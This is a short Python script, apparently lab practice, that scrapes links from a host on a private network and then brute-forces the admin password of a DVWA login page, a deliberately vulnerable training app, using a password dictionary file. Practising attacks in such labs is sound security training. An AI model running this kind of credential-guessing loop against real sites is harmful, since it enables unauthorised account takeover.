import requests
from bs4 import BeautifulSoup

req_ = requests.get('http://192.168.56.3')
# print(req_.headers)
# print(req_.content)
# print(req_.text)

soup = BeautifulSoup(req_.text, 'html.parser')
# print(soup.prettify())
# print(soup.title)
home_ = requests.get('http://192.168.56.3/')
soup = BeautifulSoup(home_.content,"html.parser")
imgs = soup.find_all("a",href=True)
imgs_href= []
for img in imgs:
    imgs_href.append(img['href'])
imgs_set = set(imgs_href)

for img in imgs_set:
    print(img)

# word_p = requests.get('http://192.168.56.3/phpMyAdmin/')
word_p = requests.get('http://192.168.56.3/dvwa/login.php/')
soup_word_p = BeautifulSoup(word_p.text,'html.parser')
print(soup_word_p.prettify())


passfile = "password_dictionary.txt"
with open(passfile, "r") as f:
    for word in f:
        word = word.strip("\n")
        trying_ = requests.post('http://192.168.56.3/dvwa/login.php/',data={'username':'admin', 'password':word})

        if "Welcome" in trying_.text:
            print('Suuccess, the password is: '+word)
            break
        else:
            print('incorrect password '+word)